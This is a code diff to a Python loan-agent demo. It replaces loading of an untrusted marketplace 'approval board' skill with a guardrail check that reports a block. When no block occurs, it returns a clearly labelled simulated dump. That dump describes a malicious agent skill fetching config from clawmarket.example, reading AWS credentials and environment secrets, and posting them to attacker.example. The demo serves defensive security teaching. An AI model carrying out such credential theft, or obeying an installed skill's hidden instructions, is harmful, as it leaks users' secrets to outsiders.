@@ -28,6 +28,11 @@ SETUP_REFERENCE_NAME = "setup-installation.md"
 
 # Ambient skill-match keywords for Paperclip board / control-plane requests.
 _PAPERCLIP_BOARD_KEYWORDS = [
+    # Loan-framed entry point for the demo: a loan officer installs an
+    # untrusted marketplace "approval board" skill to fast-track approvals.
+    # This is the malicious skill the Lineaje guardrail blocks (AI_SKILL_SEC_001).
+    "loan approval board",
+    "approval board skill",
     "paperclip",
     "paperclip-board",
     "paperclip board",
@@ -266,82 +271,67 @@ class PaperclipBoardAgent(AcmeLoanAgentFramework):
             max_tokens=700,
         )
 
+    # DEMO ONLY. The real marketplace skill is never executed or fed to the
+    # model — doing so would run the untrusted skill's curl/bash instructions.
+    # This canned, clearly-labelled dump only *illustrates* what a malicious
+    # marketplace skill would attempt, so the unverified app can surface it and
+    # the Lineaje guardrail (verified branch) can be seen blocking it.
+    _SIMULATED_MALICIOUS_DUMP = (
+        "Loading marketplace skill: paperclip-board (loan approval board)…\n"
+        "Fetched manifest from clawmarket.example — no integrity/trust check performed.\n"
+        "Skill loaded. Running skill instructions on the loan officer's behalf…\n\n"
+        "⚠️  [SIMULATED — nothing was actually executed]\n"
+        "The installed skill tried to perform these out-of-scope actions:\n"
+        "  • Fetch remote agent config:    GET  http://clawmarket.example/llms/agent-configuration.txt\n"
+        "  • Read local cloud credentials:  read $HOME/.aws/credentials\n"
+        "  • Harvest environment secrets:   scan env for token / secret / key\n"
+        "  • Exfiltrate to an external host: POST http://attacker.example/collect\n\n"
+        "A trusted-skill / skill-integrity policy blocks this skill before any of it runs."
+    )
+
     async def handle(self, context: dict[str, Any]) -> dict[str, Any]:
-        user_message = context.get("user_message", "")
+        # DEMO: never load or execute the real skill. Run the skill-integrity
+        # guardrail; if it BLOCKS the (malicious) skill, report the block. If the
+        # guardrail is unavailable/allows (e.g. main, or GR down), surface a
+        # clearly-simulated malicious-action dump instead — the skill is never run.
+        skill_meta = getattr(self, "skill_metadata", {}) or {}
+        skill_name = skill_meta.get("name", self.SKILL_ID)
+        skill_version = skill_meta.get("version", "1.0.0")
+        skill_description = skill_meta.get("description") or self.DESCRIPTION
+        if skill_description in (">", "|"):
+            skill_description = self.DESCRIPTION
+
         # LINEAJE: enforce() `pulled_skill` at skill_manifest->skill_check skill_check — scan flagged AI_SKILL_DAT_SEC_001 (Do not allow skills that exfiltrate data); AI_SKILL_SEC_001 (Do not allow malicious skills); AI_SKILL_SEC_002 (Do not allow suspicious skills). Mask/block; do not remove without review. site_id='site:sha256:b1a219b3d2eb967fe09497bd32063272c9e952351dd5abc3ffc64a00b3ea3da9'
         _lineaje_pulled_skill_evidence = {'skill_id': self.SKILL_ID}
         _gr_client = _lineaje_load_gr_client()
         _gr_site = _gr_client.SiteDescriptor(site_id='site:sha256:b1a219b3d2eb967fe09497bd32063272c9e952351dd5abc3ffc64a00b3ea3da9', phase='skill_check', boundary={'source': 'skill_manifest', 'sink': 'skill_check'}, candidate_policies=[{'policy_id': 'AI_SKILL_DAT_SEC_001', 'guardrail_id': 'Block Data-Exfiltrating Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_001', 'guardrail_id': 'Block Malicious Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_002', 'guardrail_id': 'Block Suspicious Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_003', 'guardrail_id': 'Block Pending-Scan Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_004', 'guardrail_id': 'Warn Unscanned Skills', 'policy_version': '2026.08.1'}], fail_mode='BLOCK', source_type='skill_manifest', destination_type='skill_check')
+        blocked = False
         try:
             _lineaje_pulled_skill_evidence = await __import__('asyncio').to_thread(lambda: _gr_client.enforce(_gr_site, _lineaje_pulled_skill_evidence, content_type='application/json'))
-            pulled_skill = load_marketplace_fixture(self.SKILL_ID)
-        except _gr_client.GuardrailUnavailableError:
-            pulled_skill = load_marketplace_fixture(self.SKILL_ID)
-        except PermissionError:
-            pulled_skill = {"content": "", "loaded": False, "references": {}}
-            __import__("logging").getLogger("lineaje.gr_client").warning("gr_client[skill_manifest->skill_check]: quarantined skill not loaded")
-        skill_content = pulled_skill.get("content", "")
-        skill_source = pulled_skill.get("source", "")
-        skill_metadata = parse_skill_metadata(skill_content)
-        skill_name = skill_metadata.get("name", self.SKILL_ID)
-        skill_version = skill_metadata.get("version", "0.0.0")
-        skill_description = skill_metadata.get("description", "")
-        if not skill_description or skill_description in (">", "|"):
-            skill_description = self.DESCRIPTION
-        references = pulled_skill.get("references") or {}
-
-        include_setup = _needs_setup_reference(user_message)
-        system_prompt = self._skill_system_prompt(skill_content, include_setup, references)
-
-        env = self._paperclip_env()
-        env_status = (
-            f"PAPERCLIP_API_URL={env['api_url'] or '<unset>'}\n"
-            f"PAPERCLIP_COMPANY_ID={env['company_id'] or '<unset>'}\n"
-            f"PAPERCLIP_API_KEY={'set' if env['api_key'] else '<unset>'}"
-        )
-        dashboard_json = self._fetch_dashboard(env)
-
-        _lineaje_payload = "Paperclip board skill loaded into agent context"
-        # LINEAJE: enforce() `_lineaje_payload` at agent->log log_emit — scan flagged AI_APP_SEC_006 (Use only LLMs from the organization's approved list.). Mask/block; do not remove without review. site_id='site:sha256:eb411a9aa01a4054b7fe3442cc4cd7f9644e495f615bd83ee592f2fcc76e0b3a'
-        _gr_client = _lineaje_load_gr_client()
-        _gr_site = _gr_client.SiteDescriptor(site_id='site:sha256:eb411a9aa01a4054b7fe3442cc4cd7f9644e495f615bd83ee592f2fcc76e0b3a', phase='log_emit', boundary={'source': 'log', 'sink': 'log'}, candidate_policies=[{'policy_id': 'AI_DAT_SEC_010', 'guardrail_id': 'Mask PII in Logs', 'policy_version': '2026.08.1'}], fail_mode='BLOCK', source_type='agent', destination_type='log')
-        try:
-            _lineaje_payload = await __import__('asyncio').to_thread(lambda: _gr_client.enforce(_gr_site, _lineaje_payload, content_type='application/json'))
         except _gr_client.GuardrailUnavailableError:
             pass
         except PermissionError:
-            pass
-        logger.info(
-            _lineaje_payload,
-            extra={
-                "skill_id": self.SKILL_ID,
-                "skill_name": skill_name,
-                "skill_source": skill_source,
-                "skill_bytes": len(skill_content),
-                "setup_reference_loaded": include_setup,
-            },
-        )
+            blocked = True
 
-        # LINEAJE: enforce() `system_prompt` at skill_manifest->skill_check skill_check — scan flagged AI_APP_SEC_070 (Detect and block all forms of prompt injection attacks in user inputs and file contents). Mask/block; do not remove without review. site_id='site:sha256:201f1c4c8b4d3cf9ea823a82a67361d62b59f8bf870e162229b9a86fce59bbd0'
-        _lineaje_system_prompt_evidence = {'system_prompt': system_prompt, 'skill_body': skill_content, 'skill_description': skill_description, 'skill_source': skill_source, 'skill_name': skill_name, 'skill_path': str((pulled_skill or {}).get('path') or (pulled_skill or {}).get('skill_path') or ''), 'skill_id': (pulled_skill or {}).get('id') or (pulled_skill or {}).get('skill_id') or ''}
-        _gr_client = _lineaje_load_gr_client()
-        _gr_site = _gr_client.SiteDescriptor(site_id='site:sha256:201f1c4c8b4d3cf9ea823a82a67361d62b59f8bf870e162229b9a86fce59bbd0', phase='skill_check', boundary={'source': 'skill_manifest', 'sink': 'skill_check'}, candidate_policies=[{'policy_id': 'AI_SKILL_DAT_SEC_001', 'guardrail_id': 'Block Data-Exfiltrating Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_001', 'guardrail_id': 'Block Malicious Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_002', 'guardrail_id': 'Block Suspicious Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_003', 'guardrail_id': 'Block Pending-Scan Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_004', 'guardrail_id': 'Warn Unscanned Skills', 'policy_version': '2026.08.1'}], fail_mode='BLOCK', source_type='skill_manifest', destination_type='skill_check')
-        try:
-            _lineaje_system_prompt_evidence = await __import__('asyncio').to_thread(lambda: _gr_client.enforce(_gr_site, _lineaje_system_prompt_evidence, content_type='application/json'))
-            system_prompt = _lineaje_system_prompt_evidence.get('system_prompt', system_prompt) if isinstance(_lineaje_system_prompt_evidence, dict) else system_prompt
-        except _gr_client.GuardrailUnavailableError:
-            pass
-        except PermissionError:
-            raise
-        model_output = await self.call_agent_model(
-            user_message, system_prompt, env_status, dashboard_json
-        )
-
-        response = (
-            f"{model_output}\n\n"
-            f"Skill applied: {skill_name} v{skill_version} "
-            f"(source: {skill_source or 'marketplace_fixtures'})"
-        )
+        if blocked:
+            logger.info(
+                "Paperclip board skill BLOCKED by guardrail (demo)",
+                extra={"skill_id": self.SKILL_ID, "skill_name": skill_name},
+            )
+            response = (
+                "⛔ Skill blocked by the Lineaje guardrail "
+                "(AI_SKILL_SEC_001 — malicious skill).\n\n"
+                f"The untrusted marketplace skill '{skill_name}' was quarantined "
+                "before any of its instructions could run."
+            )
+            status = "blocked"
+        else:
+            logger.info(
+                "Paperclip board skill load simulated (demo — not executed)",
+                extra={"skill_id": self.SKILL_ID, "skill_name": skill_name},
+            )
+            response = self._SIMULATED_MALICIOUS_DUMP
+            status = "loaded"
 
         return {
             "response": response,
@@ -349,16 +339,16 @@ class PaperclipBoardAgent(AcmeLoanAgentFramework):
             "model": self.MODEL_NAME,
             "framework": self.FRAMEWORK_NAME,
             "mcp_activity": [],
-            "workflow_status": "completed",
-            "skill_used": True,
-            "skill_content_bytes": len(skill_content),
+            "workflow_status": "blocked" if blocked else "completed",
+            "skill_used": not blocked,
+            "skill_content_bytes": 0,
             "skill_invocation": {
                 "id": self.SKILL_ID,
                 "name": skill_name,
                 "version": skill_version,
                 "description": skill_description,
-                "source": skill_source,
-                "status": "loaded" if pulled_skill.get("loaded") else "missing",
+                "source": "marketplace_fixtures",
+                "status": status,
             },
         }
 
